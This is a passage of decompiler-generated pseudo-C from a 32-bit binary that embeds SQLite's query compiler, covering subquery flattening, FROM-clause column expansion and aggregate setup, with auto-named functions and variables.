    v10 = sub_1007D3E0(a1, *(_DWORD *)(a2 + 12), a3, a4);
    v11 = (*(_WORD *)(a2 + 2) & 0x800) == 0;
    *(_DWORD *)(a2 + 12) = v10;
    if ( v11 )
    {
      v12 = *(_DWORD **)(a2 + 16);
      if ( v12 )
      {
        for ( i = 0; i < *v12; v5 += 20 )
        {
          ++i;
          *(_DWORD *)(v5 + v12[3]) = sub_1007D3E0(a1, *(_DWORD *)(v12[3] + v5), a3, a4);
        }
      }
    }
    else
    {
      sub_1007D521(a1, *(_DWORD *)(a2 + 16), a3, a4);
    }
  }
  return (_DWORD *)v4;
}

//----- (1007D4E2) --------------------------------------------------------
void __usercall sub_1007D4E2(int *a1@<esi>, int a2, int a3, int a4)
{
  int v4; // ebx
  int v5; // edi

  v4 = 0;
  if ( a1 && *a1 > 0 )
  {
    v5 = 0;
    do
    {
      *(_DWORD *)(v5 + a1[3]) = sub_1007D3E0(a2, *(_DWORD *)(a1[3] + v5), a3, a4);
      ++v4;
      v5 += 20;
    }
    while ( v4 < *a1 );
  }
}

//----- (1007D521) --------------------------------------------------------
void __cdecl sub_1007D521(int a1, int a2, int a3, int a4)
{
  int v4; // ebx
  _DWORD *v5; // edi
  _DWORD *v6; // edi
  int v7; // ebx
  _DWORD *v8; // edi
  int v9; // ebx
  __int16 *v10; // esi
  int v11; // edi
  _DWORD *v12; // esi
  int i; // [esp+Ch] [ebp-4h]
  int j; // [esp+Ch] [ebp-4h]
  int k; // [esp+Ch] [ebp-4h]

  v4 = 0;
  if ( a2 )
  {
    v5 = *(_DWORD **)a2;
    if ( *(_DWORD *)a2 )
    {
      for ( i = 0; i < *v5; v4 += 20 )
      {
        ++i;
        *(_DWORD *)(v4 + v5[3]) = sub_1007D3E0(a1, *(_DWORD *)(v4 + v5[3]), a3, a4);
      }
    }
    v6 = *(_DWORD **)(a2 + 16);
    v7 = 0;
    if ( v6 )
    {
      for ( j = 0; j < *v6; v7 += 20 )
      {
        ++j;
        *(_DWORD *)(v7 + v6[3]) = sub_1007D3E0(a1, *(_DWORD *)(v7 + v6[3]), a3, a4);
      }
    }
    v8 = *(_DWORD **)(a2 + 24);
    v9 = 0;
    if ( v8 )
    {
      for ( k = 0; k < *v8; v9 += 20 )
      {
        ++k;
        *(_DWORD *)(v9 + v8[3]) = sub_1007D3E0(a1, *(_DWORD *)(v9 + v8[3]), a3, a4);
      }
    }
    *(_DWORD *)(a2 + 20) = sub_1007D3E0(a1, *(_DWORD *)(a2 + 20), a3, a4);
    *(_DWORD *)(a2 + 12) = sub_1007D3E0(a1, *(_DWORD *)(a2 + 12), a3, a4);
    sub_1007D521(a1, *(_DWORD *)(a2 + 28), a3, a4);
    v10 = *(__int16 **)(a2 + 8);
    if ( v10 )
    {
      v11 = *v10;
      if ( v11 > 0 )
      {
        v12 = v10 + 12;
        do
        {
          sub_1007D521(a1, *v12, a3, a4);
          --v11;
          v12 += 14;
        }
        while ( v11 > 0 );
      }
    }
  }
}
// 1007D3E0: using guessed type _DWORD __cdecl sub_1007D3E0(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (1007D656) --------------------------------------------------------
int __usercall sub_1007D656@<eax>(int a1@<eax>, int *a2, int a3, int a4, int a5)
{
  int v5; // ebx
  __int16 *v6; // ecx
  unsigned int *v7; // esi
  int v8; // eax
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  _WORD *v13; // ecx
  int *v14; // ecx
  int v15; // edx
  _WORD *i; // ecx
  _DWORD *v17; // eax
  unsigned int v18; // eax
  __int16 v19; // cx
  int *v20; // ecx
  unsigned int *v21; // ecx
  __int16 *v22; // esi
  int v23; // edi
  __int16 *v24; // eax
  __int16 *v25; // eax
  int *v26; // esi
  int v27; // edi
  int v28; // eax
  _BYTE *v29; // eax
  unsigned int v30; // edi
  int v31; // eax
  int *v32; // esi
  void **v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // eax
  int v36; // eax
  unsigned int v37; // [esp+Ch] [ebp-2Ch]
  unsigned int *v38; // [esp+10h] [ebp-28h]
  int v39; // [esp+14h] [ebp-24h]
  int v40; // [esp+18h] [ebp-20h]
  int v41; // [esp+18h] [ebp-20h]
  _DWORD *v42; // [esp+1Ch] [ebp-1Ch]
  unsigned int **v43; // [esp+1Ch] [ebp-1Ch]
  int v44; // [esp+20h] [ebp-18h]
  int v45; // [esp+20h] [ebp-18h]
  char *v46; // [esp+24h] [ebp-14h]
  int v47; // [esp+28h] [ebp-10h]
  int v48; // [esp+2Ch] [ebp-Ch]
  unsigned int v49; // [esp+2Ch] [ebp-Ch]
  __int16 *v50; // [esp+30h] [ebp-8h]
  __int16 *v51; // [esp+30h] [ebp-8h]
  int v52; // [esp+34h] [ebp-4h]
  int j; // [esp+40h] [ebp+8h]
  _DWORD *v54; // [esp+40h] [ebp+8h]
  char v55; // [esp+43h] [ebp+Bh]

  v5 = a1;
  v52 = *a2;
  if ( (*(_BYTE *)(*a2 + 12) & 1) != 0 )
    return 0;
  v6 = *(__int16 **)(a1 + 8);
  v7 = (unsigned int *)&v6[28 * a3 + 4];
  v39 = 28 * a3;
  v47 = *(_DWORD *)&v6[28 * a3 + 16];
  v8 = *(_DWORD *)&v6[28 * a3 + 12];
  v50 = *(__int16 **)(v5 + 8);
  v38 = v7;
  if ( a4 )
  {
    if ( a5 )
      return 0;
  }
  else if ( a5 && *v6 > 1 )
  {
    return 0;
  }
  v10 = *(_DWORD *)(v8 + 40);
  if ( v10 && *(_DWORD *)(v5 + 40)
    || *(_DWORD *)(v8 + 44)
    || *(_DWORD *)(v5 + 36) && v10 && *(_DWORD *)(v8 + 24)
    || !**(_WORD **)(v8 + 8)
    || ((*(_BYTE *)(v8 + 6) & 1) != 0 || v10) && (*v50 > 1 || a4)
    || (*(_WORD *)(v5 + 6) & 1) != 0 && a5
    || *(_DWORD *)(v5 + 24) && *(_DWORD *)(v8 + 24)
    || a4 && *(_DWORD *)(v8 + 24)
    || v10 && *(_DWORD *)(v5 + 12)
    || (v6[28 * a3 + 14] & 0x2000) != 0 )
  {
    return 0;
  }
  if ( *(_DWORD *)(v8 + 28) )
  {
    if ( !*(_DWORD *)(v8 + 24) && !a4 && (*(_WORD *)(v5 + 6) & 1) == 0 && *v50 == 1 )
    {
      v11 = *(_DWORD *)&v6[28 * a3 + 12];
      while ( (*(_BYTE *)(v11 + 6) & 5) == 0 )
      {
        v12 = *(_DWORD *)(v11 + 28);
        if ( v12 )
        {
          if ( *(_BYTE *)(v11 + 4) != 113 )
            break;
        }
        v13 = *(_WORD **)(v11 + 8);
        if ( !v13 || *v13 != 1 )
          break;
        v11 = v12;
        if ( !v12 )
        {
          v14 = *(int **)(v5 + 24);
          if ( !v14 )
            goto LABEL_45;
          v15 = 0;
          if ( *v14 <= 0 )
            goto LABEL_45;
          for ( i = (_WORD *)(v14[3] + 14); *i; i += 10 )
          {
            if ( ++v15 >= **(_DWORD **)(v5 + 24) )
              goto LABEL_45;
          }
          return 0;
        }
      }
    }
    return 0;
  }
LABEL_45:
  a2[127] = a2[127];
  while ( 1 )
  {
    v48 = *(_DWORD *)(v8 + 28);
    if ( !v48 )
      break;
    v44 = *(_DWORD *)(v5 + 24);
    v40 = *(_DWORD *)(v5 + 40);
    v42 = *(_DWORD **)(v5 + 28);
    *(_DWORD *)(v5 + 24) = 0;
    *(_DWORD *)(v5 + 8) = 0;
    *(_DWORD *)(v5 + 28) = 0;
    *(_DWORD *)(v5 + 40) = 0;
    v17 = sub_100765C5(v52, v5, 0);
    *(_DWORD *)(v5 + 40) = v40;
    *(_DWORD *)(v5 + 24) = v44;
    *(_DWORD *)(v5 + 8) = v50;
    *(_BYTE *)(v5 + 4) = 113;
    *(_DWORD *)(v5 + 36) = 0;
    if ( v17 )
    {
      v17[7] = v42;
      v17[9] = 0;
    }
    else
    {
      v17 = v42;
    }
    *(_DWORD *)(v5 + 28) = v17;
    if ( *(_BYTE *)(v52 + 30) )
      return 1;
    v8 = v48;
  }
  v37 = v7[4];
  v49 = v37;
  sub_10058EC7(v52, *v7);
  sub_10058EC7(v52, v7[1]);
  sub_10058EC7(v52, v7[2]);
  v18 = v7[3];
  *v7 = 0;
  v7[1] = 0;
  v7[2] = 0;
  v7[4] = 0;
  if ( v18 )
  {
    v19 = *(_WORD *)(v18 + 32);
    if ( v19 == 1 )
    {
      v20 = (int *)a2[106];
      if ( !v20 )
        v20 = a2;
      v21 = (unsigned int *)(v20 + 134);
      *(_DWORD *)(v18 + 72) = *v21;
      *v21 = v18;
    }
    else
    {
      *(_WORD *)(v18 + 32) = v19 - 1;
    }
    v7[3] = 0;
  }
  v45 = v5;
  while ( 1 )
  {
    v22 = *(__int16 **)(v49 + 8);
    v23 = *v22;
    v24 = *(__int16 **)(v5 + 8);
    v55 = 0;
    v51 = v24;
    if ( v24 )
    {
      v55 = *((_BYTE *)v38 + 21);
    }
    else
    {
      v24 = sub_1006C71D(0, v52, 0, 0);
      *(_DWORD *)(v5 + 8) = v24;
      v51 = v24;
      if ( !v24 )
        break;
    }
    if ( v23 > 1 )
    {
      v25 = sub_1006C653(v24, v52, v23 - 1, a3 + 1);
      *(_DWORD *)(v5 + 8) = v25;
      v51 = v25;
      if ( *(_BYTE *)(v52 + 30) )
        break;
    }
    if ( v23 > 0 )
    {
      v46 = (char *)(v22 + 4);
      v43 = (unsigned int **)&v51[v39 + 4];
      v41 = v23;
      do
      {
        sub_1006C5DA(v43[8], v52);
        qmemcpy(v43, v46, 0x38u);
        memset(v46, 0, 0x38u);
        v43 += 14;
        v46 += 56;
        --v41;
      }
      while ( v41 );
    }
    HIBYTE(v51[v39 + 14]) = v55;
    v26 = *(int **)v5;
    v27 = 0;
    for ( j = 0; j < *v26; v27 += 20 )
    {
      v28 = v27 + v26[3];
      if ( !*(_DWORD *)(v28 + 4) )
      {
        v29 = *(_BYTE **)(v28 + 8);
        if ( v29 )
          *(_DWORD *)(v26[3] + v27 + 4) = sub_10059194(v29);
      }
      ++j;
    }
    v30 = v49;
    sub_1007D4E2(*(int **)v5, v52, v47, *(_DWORD *)v49);
    if ( a4 )
    {
      sub_1007D4E2(*(int **)(v5 + 16), v52, v47, *(_DWORD *)v49);
      *(_DWORD *)(v5 + 20) = sub_1007D3E0(v52, *(_DWORD *)(v5 + 20), v47, *(_DWORD *)v49);
    }
    v31 = *(_DWORD *)(v49 + 24);
    if ( v31 )
    {
      *(_DWORD *)(v5 + 24) = v31;
      *(_DWORD *)(v49 + 24) = 0;
    }
    else
    {
      v32 = *(int **)(v5 + 24);
      if ( v32 )
        sub_1007D4E2(v32, v52, v47, *(_DWORD *)v49);
    }
    v33 = *(void ***)(v49 + 12);
    v54 = v33 ? sub_1007631C(v52, v33, 0) : 0;
    if ( a5 )
    {
      *(_DWORD *)(v5 + 20) = *(_DWORD *)(v5 + 12);
      *(_DWORD *)(v5 + 12) = v54;
      *(_DWORD *)(v5 + 20) = sub_1007D3E0(v52, *(_DWORD *)(v5 + 20), v47, *(_DWORD *)v49);
      v34 = sub_1007631C(v52, *(void ***)(v49 + 20), 0);
      *(_DWORD *)(v5 + 20) = sub_10075DEF(v34, v52, *(_DWORD *)(v5 + 20));
      v30 = v49;
      *(_DWORD *)(v45 + 16) = sub_10076339(*(int **)(v49 + 16), v52, 0);
      v5 = v45;
    }
    else
    {
      v35 = sub_1007D3E0(v52, *(_DWORD *)(v5 + 12), v47, *(_DWORD *)v49);
      *(_DWORD *)(v5 + 12) = v35;
      *(_DWORD *)(v5 + 12) = sub_10075DEF(v54, v52, (unsigned int)v35);
    }
    *(_WORD *)(v5 + 6) |= *(_BYTE *)(v30 + 6) & 1;
    v36 = *(_DWORD *)(v30 + 40);
    if ( v36 )
    {
      *(_DWORD *)(v5 + 40) = v36;
      *(_DWORD *)(v30 + 40) = 0;
    }
    v45 = *(_DWORD *)(v5 + 28);
    v49 = *(_DWORD *)(v30 + 28);
    if ( !v45 )
      break;
    v5 = *(_DWORD *)(v5 + 28);
  }
  sub_1007B016(v52, v37);
  return 1;
}

//----- (1007DAFF) --------------------------------------------------------
char __usercall sub_1007DAFF@<al>(int *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // ecx
  unsigned __int8 *v4; // esi

  v1 = *a1;
  if ( *(_DWORD *)v1 != 1 )
    return 0;
  v2 = **(_DWORD **)(v1 + 12);
  if ( *(_BYTE *)v2 != 0x99 )
    return 0;
  if ( (*(_WORD *)(v2 + 2) & 0x800) != 0 )
    return 0;
  v3 = *(_DWORD *)(v2 + 16);
  if ( !v3 || *(_DWORD *)v3 != 1 || ***(_BYTE ***)(v3 + 12) != 0x9A )
    return 0;
  v4 = *(unsigned __int8 **)(v2 + 4);
  if ( sub_100593BE(v4, (unsigned __int8 *)aMin) )
    return sub_100593BE(v4, (unsigned __int8 *)aMax) != 0 ? 0 : 2;
  else
    return 1;
}

//----- (1007DB62) --------------------------------------------------------
int __usercall sub_1007DB62@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  _DWORD *v2; // ecx
  int v3; // eax
  int v4; // eax
  _BYTE *v5; // ecx

  if ( !a1[3]
    && (v2 = (_DWORD *)*a1, *(_DWORD *)*a1 == 1)
    && (v3 = a1[2], *(_WORD *)v3 == 1)
    && !*(_DWORD *)(v3 + 24)
    && (v4 = *(_DWORD *)(v3 + 20), v5 = *(_BYTE **)v2[3], (*(_BYTE *)(v4 + 34) & 0x10) == 0)
    && *v5 == 0x99
    && (*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a2 + 32) + 4) + 3) & 0x20) != 0 )
  {
    return (v5[2] & 0x10) == 0 ? v4 : 0;
  }
  else
  {
    return 0;
  }
}

//----- (1007DBAF) --------------------------------------------------------
int __usercall sub_1007DBAF@<eax>(_DWORD *a1@<eax>, int *a2)
{
  int v3; // eax
  unsigned __int8 *v4; // ebx
  int v5; // esi

  v3 = a1[3];
  if ( v3 )
  {
    v4 = (unsigned __int8 *)a1[12];
    if ( v4 )
    {
      v5 = *(_DWORD *)(v3 + 20);
      if ( !v5 )
        goto LABEL_7;
      do
      {
        if ( !sub_100593BE(*(unsigned __int8 **)v5, v4) )
          break;
        v5 = *(_DWORD *)(v5 + 32);
      }
      while ( v5 );
      if ( !v5 )
      {
LABEL_7:
        sub_10059320(a2, "no such index: %s", (const char *)v4);
        return 1;
      }
      a1[13] = v5;
    }
  }
  return 0;
}

//----- (1007DC06) --------------------------------------------------------
int __cdecl sub_1007DC06(int a1, int a2)
{
  int v2; // ecx
  int v3; // edi
  __int16 *v5; // esi
  __int16 v6; // ax
  int v7; // edx
  __int16 *v8; // ebx
  unsigned __int8 *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // edi
  bool v12; // cf
  int **i; // eax
  int *v14; // eax
  int *v15; // edi
  _DWORD *v16; // eax
  int v17; // edi
  int v18; // ebx
  char **v19; // ecx
  char v20; // dl
  int v21; // ecx
  int v22; // eax
  _DWORD *v23; // edi
  unsigned int v24; // ebx
  char v25; // al
  int *v26; // eax
  __int16 *v27; // esi
  _DWORD *v28; // edi
  int v29; // eax
  char *v30; // ebx
  _DWORD *v31; // edi
  _DWORD *v32; // eax
  int *v33; // [esp+Ch] [ebp-54h]
  int v34; // [esp+10h] [ebp-50h]
  int v35; // [esp+14h] [ebp-4Ch]
  int v36; // [esp+14h] [ebp-4Ch]
  int *v37; // [esp+18h] [ebp-48h]
  __int16 *v38; // [esp+1Ch] [ebp-44h]
  unsigned __int8 *v39; // [esp+20h] [ebp-40h]
  int *v40; // [esp+24h] [ebp-3Ch]
  char *v41; // [esp+28h] [ebp-38h]
  __int16 *v42; // [esp+2Ch] [ebp-34h]
  int **v43; // [esp+30h] [ebp-30h]
  _DWORD *v44; // [esp+30h] [ebp-30h]
  int v45; // [esp+34h] [ebp-2Ch]
  _DWORD *v46; // [esp+38h] [ebp-28h]
  int v47; // [esp+3Ch] [ebp-24h]
  int v48; // [esp+40h] [ebp-20h]
  int v49; // [esp+44h] [ebp-1Ch]
  char *v50; // [esp+48h] [ebp-18h]
  char *v51; // [esp+4Ch] [ebp-14h]
  unsigned int v52; // [esp+4Ch] [ebp-14h]
  int v53; // [esp+50h] [ebp-10h]
  __int16 *v54; // [esp+54h] [ebp-Ch]
  int v55[2]; // [esp+58h] [ebp-8h] BYREF

  v2 = *(_DWORD *)(a1 + 8);
  v3 = *(_DWORD *)v2;
  v33 = (int *)v2;
  v34 = *(_DWORD *)v2;
  if ( *(_BYTE *)(*(_DWORD *)v2 + 30) )
    return 2;
  v5 = *(__int16 **)(a2 + 8);
  v38 = v5;
  if ( !v5 )
    return 1;
  v6 = *(_WORD *)(a2 + 6);
  if ( (v6 & 0x10) != 0 )
    return 1;
  *(_WORD *)(a2 + 6) = v6 | 0x10;
  v40 = *(int **)a2;
  sub_1006C7A7(v2, v5);
  v35 = 0;
  v8 = v5 + 4;
  v54 = v5 + 4;
  if ( *v5 > 0 )
  {
    do
    {
      if ( *((_DWORD *)v8 + 3) )
        return 1;
      v9 = (unsigned __int8 *)*((_DWORD *)v8 + 1);
      if ( v9 )
      {
        v14 = sub_10069EB7((int)v33, 0, v9, *(unsigned __int8 **)v8);
        v15 = v14;
        *((_DWORD *)v8 + 3) = v14;
        if ( !v14 )
          return 2;
        ++*((_WORD *)v14 + 16);
        if ( v14[7] || (*((_BYTE *)v14 + 34) & 0x10) != 0 )
        {
          if ( sub_1006B423(v33, (int)v14) )
            return 2;
          v16 = sub_100765C5(v34, v15[7], 0);
          *((_DWORD *)v8 + 4) = v16;
          sub_10085024(a1, (int)v16);
        }
      }
      else
      {
        v43 = (int **)*((_DWORD *)v8 + 4);
        sub_10085024(a1, (int)v43);
        v10 = sub_1005904B(v3, 0x4Cu);
        v11 = v10;
        *((_DWORD *)v8 + 3) = v10;
        if ( !v10 )
          return 2;
        v12 = *(_BYTE *)(v34 + 226) != 0;
        *((_WORD *)v10 + 16) = 1;
        *v10 = v12 ? v34 : 0;
        v10[1] = sub_10055484(v34, "sqlite_subquery_%p_", v10);
        for ( i = v43; ; v43 = i )
        {
          i = (int **)i[7];
          if ( !i )
            break;
        }
        sub_1007BF77(v33, *v43, v11 + 3, (char ***)v11 + 4);
        v11[2] = -1;
        v5 = v38;
        *((_BYTE *)v11 + 34) |= 2u;
      }
      if ( sub_1007DBAF(v8, v33) )
        return 2;
      ++v35;
      v3 = v34;
      v8 += 28;
    }
    while ( v35 < *v5 );
    v7 = a2;
  }
  if ( *(_BYTE *)(v3 + 30) || sub_1007B230(v33, v7) )
    return 2;
  v17 = *v40;
  v18 = 0;
  if ( *v40 > 0 )
  {
    v19 = (char **)v40[3];
    do
    {
      v20 = **v19;
      if ( v20 == 113 || v20 == 118 && **((_BYTE **)*v19 + 3) == 113 )
        break;
      ++v18;
      v19 += 5;
    }
    while ( v18 < v17 );
  }
  if ( v18 < v17 )
  {
    v21 = v40[3];
    v22 = *(_DWORD *)(*v33 + 12);
    v37 = 0;
    if ( (v22 & 0x400) == 0 || (v45 = 1, (v22 & 0x800) != 0) )
      v45 = 0;
    v49 = 0;
    if ( v17 > 0 )
    {
      v23 = (_DWORD *)(v21 + 8);
      v44 = (_DWORD *)(v21 + 8);
      while ( 1 )
      {
        v24 = *(v23 - 2);
        v25 = *(_BYTE *)v24;
        if ( *(_BYTE *)v24 == 113 || v25 == 118 && **(_BYTE **)(v24 + 12) == 113 )
          break;
        v26 = sub_100766CA(v33, v37, v24);
        v37 = v26;
        if ( v26 )
        {
          *(_DWORD *)(20 * *v26 + v26[3] - 16) = *(v23 - 1);
          *(_DWORD *)(20 * *v26 + v26[3] - 12) = *v23;
          *(v23 - 1) = 0;
          *v23 = 0;
        }
        *(v23 - 2) = 0;
LABEL_73:
        ++v49;
        v23 += 5;
        v44 = v23;
        if ( v49 >= *v40 )
          goto LABEL_74;
        v5 = v38;
      }
      v53 = 0;
      if ( v25 == 118 )
        v39 = *(unsigned __int8 **)(*(_DWORD *)(v24 + 8) + 4);
      else
        v39 = 0;
      v36 = 0;
      if ( *v5 <= 0 )
        goto LABEL_69;
      v27 = v54 + 4;
      v42 = v54 + 4;
      do
      {
        v28 = (_DWORD *)*((_DWORD *)v27 + 1);
        v46 = v28;
        v41 = *(char **)v27;
        if ( !*(_DWORD *)v27 )
          v41 = (char *)v28[1];
        if ( *(_BYTE *)(v34 + 30) )
          break;
        if ( !v39 || !sub_100593BE(v39, (unsigned __int8 *)v41) )
        {
          v53 = 1;
          v48 = 0;
          if ( (int)v28[3] > 0 )
          {
            v47 = 0;
            do
            {
              v29 = v47 + v28[4];
              v30 = *(char **)v29;
              v51 = *(char **)v29;
              if ( !*(_BYTE *)(v29 + 23) )
              {
                if ( v36 <= 0 || v39 )
                {
LABEL_61:
                  v52 = 0;
                  v31 = sub_10075D3B(v34, 26);
                  v50 = v30;
                  if ( v45 || *v38 > 1 )
                  {
                    v32 = sub_10075D3B(v34, 26);
                    v31 = sub_10075DC6(0, (unsigned int)v31, v33, 118, (unsigned int)v32);
                    if ( v45 )
                    {
                      v50 = (char *)sub_10055484(v34, "%s.%s", v41, v30);
                      v52 = (unsigned int)v50;
                    }
                  }
                  v37 = sub_100766CA(v33, v37, (unsigned int)v31);
                  v55[0] = (int)v50;
                  v55[1] = (int)sub_10059297(v50);
                  sub_1007674E((char *)v37, (int)v55, v33, 0);
                  sub_10058EC7(v34, v52);
                  v28 = v46;
                  v27 = v42;
                  goto LABEL_66;
                }
                if ( (*((_BYTE *)v27 + 13) & 4) != 0 )
                {
                  v28 = v46;
                  v27 = v42;
                  if ( sub_1007B159((int)v38, 0, v36, (unsigned __int8 *)v30, 0) )
                    goto LABEL_66;
                  v30 = v51;
                }
                if ( sub_1006C617(*((_DWORD *)v27 + 6), (unsigned __int8 *)v30) < 0 )
                  goto LABEL_61;
              }
LABEL_66:
              ++v48;
              v47 += 24;
            }
            while ( v48 < v28[3] );
          }
        }
        ++v36;
        v27 += 28;
        v42 = v27;
      }
      while ( v36 < *v38 );
      if ( !v53 )
      {
LABEL_69:
        if ( v39 )
          sub_10059320(v33, "no such table: %s", (const char *)v39);
        else
          sub_10059320(v33, aNoTablesSpecif);
      }
      v23 = v44;
      goto LABEL_73;
    }
LABEL_74:
    sub_100767B1(v40, v34);
    *(_DWORD *)a2 = v37;
  }
  if ( *(_DWORD *)a2 )
  {
    if ( **(_DWORD **)a2 > *(_DWORD *)(v34 + 80) )
      sub_10059320(v33, aTooManyColumns_1);
  }
  return 0;
}
// 1007DDB7: variable 'v7' is possibly undefined

//----- (1007E114) --------------------------------------------------------
int sub_1007E114()
{
  return 0;
}

//----- (1007E117) --------------------------------------------------------
int __cdecl sub_1007E117(int a1, int a2)
{
  int *v3; // ebx
  __int16 *v4; // esi
  _DWORD **v5; // edi
  int v6; // edx
  _DWORD *i; // eax
  int v9; // [esp+14h] [ebp+Ch]

  *(_WORD *)(a2 + 6) |= 0x20u;
  v9 = 0;
  v3 = *(int **)(a1 + 8);
  v4 = *(__int16 **)(a2 + 8);
  if ( *v4 > 0 )
  {
    v5 = (_DWORD **)(v4 + 12);
    do
    {
      v6 = (int)*(v5 - 1);
      if ( v6 && (*(_BYTE *)(v6 + 34) & 2) != 0 )
      {
        for ( i = *v5; i[7]; i = (_DWORD *)i[7] )
          ;
        sub_1007C129(i, *(_DWORD *)(v6 + 12), v3, *(_DWORD *)(v6 + 16));
      }
      ++v9;
      v5 += 14;
    }
    while ( v9 < *v4 );
  }
  return 0;
}

//----- (1007E178) --------------------------------------------------------
int __cdecl sub_1007E178(int *a1, int a2, int a3)
{
  bool v4; // zf
  int result; // eax
  int (*v6)(); // [esp+4h] [ebp-10h] BYREF
  int (__cdecl *v7)(int, int); // [esp+8h] [ebp-Ch]
  int *v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+20h] [ebp+Ch]

  if ( a2 )
  {
    v4 = (*(_BYTE *)(a2 + 6) & 0x20) == 0;
    result = *a1;
    v9 = *a1;
    if ( v4 )
    {
      v7 = sub_1007DC06;
      v6 = sub_1007E114;
      v8 = a1;
      result = sub_10085024((int)&v6, a2);
      if ( !a1[16] )
      {
        result = v9;
        if ( !*(_BYTE *)(v9 + 30) )
        {
          result = sub_100800E1((int)a1, a2, a3);
          if ( !a1[16] )
          {
            result = v9;
            if ( !*(_BYTE *)(v9 + 30) )
            {
              v7 = sub_1007E117;
              v6 = sub_1007E114;
              v8 = a1;
              return sub_10085024((int)&v6, a2);
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (1007E1FD) --------------------------------------------------------
int __usercall sub_1007E1FD@<eax>(_DWORD *a1@<ebx>, int *a2)
{
  int result; // eax
  int v3; // esi
  int v4; // edi
  int *i; // esi
  _DWORD *v6; // eax
  unsigned __int16 *v7; // eax
  int v8; // [esp+Ch] [ebp-8h]
  int *v9; // [esp+10h] [ebp-4h]

  v9 = (int *)a2[3];
  result = a1[5];
  if ( result + a1[9] )
  {
    v3 = 0;
    if ( result > 0 )
    {
      v4 = 0;
      do
      {
        result = sub_1005ABE8((int)v9, 10, 0, *(_DWORD *)(v4 + a1[4] + 16));
        ++v3;
        v4 += 24;
      }
      while ( v3 < a1[5] );
    }
    v8 = 0;
    for ( i = (int *)a1[8]; v8 < a1[9]; i += 4 )
    {
      sub_1005ABE8((int)v9, 10, 0, i[2]);
      if ( i[3] >= 0 )
      {
        v6 = *(_DWORD **)(*i + 16);
        if ( v6 && *v6 == 1 )
        {
          v7 = (unsigned __int16 *)sub_1007B93D(a2, *(int **)(*i + 16));
          sub_1005AC02(v9, 40, i[3], 0, 0, v7, (_BYTE *)0xFFFFFFF0);
        }
        else
        {
          sub_10059320(a2, aDistinctAggreg);
          i[3] = -1;
        }
      }
      result = ++v8;
    }
  }
  return result;
}

//----- (1007E2BB) --------------------------------------------------------
int __usercall sub_1007E2BB@<eax>(int a1@<eax>, int a2@<edi>)
{
  int result; // eax
  int v3; // ebx
  int v4; // esi
  int *v5; // eax
  int v6; // eax
  int *i; // [esp+Ch] [ebp-4h]

  result = *(_DWORD *)(a1 + 12);
  v3 = 0;
  v4 = *(_DWORD *)(a2 + 32);
  for ( i = (int *)result; v3 < *(_DWORD *)(a2 + 36); v4 += 16 )
  {
    v5 = *(int **)(*(_DWORD *)v4 + 16);
    if ( v5 )
      v6 = *v5;
    else
      v6 = 0;
    result = sub_1005AC02(i, 116, *(_DWORD *)(v4 + 8), v6, 0, *(unsigned __int16 **)(v4 + 4), (_BYTE *)0xFFFFFFFB);
    ++v3;
  }
  return result;
}

//----- (1007E306) --------------------------------------------------------
int __cdecl sub_1007E306(int *a1, int a2)
{
  int v2; // esi
  int v3; // ebx
  int *v4; // edi
  int v5; // esi
  int v6; // ecx
  unsigned __int8 **v7; // edi
  int *v8; // eax
  int v9; // eax
  unsigned __int8 **v10; // ebx
  int v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h]
  int *v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp-4h]
  int v17; // [esp+1Ch] [ebp-4h]

  v2 = a2;
  v14 = (int *)a1[3];
  *(_BYTE *)a2 = 1;
  sub_100773BA((int)a1);
  v16 = 0;
  v3 = *(_DWORD *)(a2 + 32);
  if ( *(int *)(a2 + 36) > 0 )
  {
    do
    {
      v4 = *(int **)(*(_DWORD *)v3 + 16);
      v5 = 0;
      v12 = 0;
      if ( v4 )
      {
        v15 = *v4;
        v5 = sub_10078AA4(a1, *v4);
        sub_10078052(v4, v6, v5, 0);
      }
      else
      {
        v15 = 0;
      }
      if ( *(int *)(v3 + 12) >= 0 )
      {
        v12 = sub_1005AC63((int)v14);
        sub_1007B57F((int)a1, *(_DWORD *)(v3 + 12), v12, (unsigned __int16 *)1, v5);
      }
      if ( (*(_BYTE *)(*(_DWORD *)(v3 + 4) + 3) & 8) != 0 )
      {
        v7 = (unsigned __int8 **)v4[3];
        v8 = 0;
        v13 = 0;
        do
        {
          if ( v13 >= v15 )
            break;
          v8 = sub_1007596F(*v7, a1);
          ++v13;
          v7 += 5;
        }
        while ( !v8 );
        if ( !v8 )
          v8 = *(int **)(*a1 + 44);
        sub_1005AC02(v14, 17, 0, 0, 0, (unsigned __int16 *)v8, (_BYTE *)0xFFFFFFFC);
      }
      sub_1005AC02(v14, 115, 0, v5, *(_DWORD *)(v3 + 8), *(unsigned __int16 **)(v3 + 4), (_BYTE *)0xFFFFFFFB);
      sub_1005AE0E((int)v14, v15);
      v9 = sub_100772A8((int)a1, v15, v5);
      sub_10078AC8(v9, v5, v15);
      if ( v12 )
      {
        sub_1005ACAF((int)v14, v12);
        sub_100773BA((int)a1);
      }
      ++v16;
      v3 += 16;
    }
    while ( v16 < *(_DWORD *)(a2 + 36) );
    v2 = a2;
  }
  v17 = 0;
  if ( *(int *)(v2 + 28) > 0 )
  {
    v10 = (unsigned __int8 **)(*(_DWORD *)(v2 + 16) + 20);
    do
    {
      sub_10077F49(a1, (int)*(v10 - 1), *v10);
      ++v17;
      v10 += 6;
    }
    while ( v17 < *(_DWORD *)(a2 + 28) );
    v2 = a2;
  }
  *(_BYTE *)v2 = 0;
  return sub_100773BA((int)a1);
}
// 1007E359: variable 'v6' is possibly undefined

//----- (1007E480) --------------------------------------------------------
int __cdecl sub_1007E480(int a1, _DWORD **a2, unsigned __int8 *a3)
{
  int *v3; // ebx
  int v4; // esi
  int v5; // edi
  int result; // eax
  bool v7; // zf
  __int16 *v8; // edi
  int v9; // eax
  int *v10; // eax
  int *v11; // ecx
  _DWORD *v12; // ecx
  int v13; // edx
  _DWORD *v14; // eax
  int v15; // eax
  int v16; // eax
  int *v17; // eax
  int *v18; // ebx
  unsigned __int16 *v19; // eax
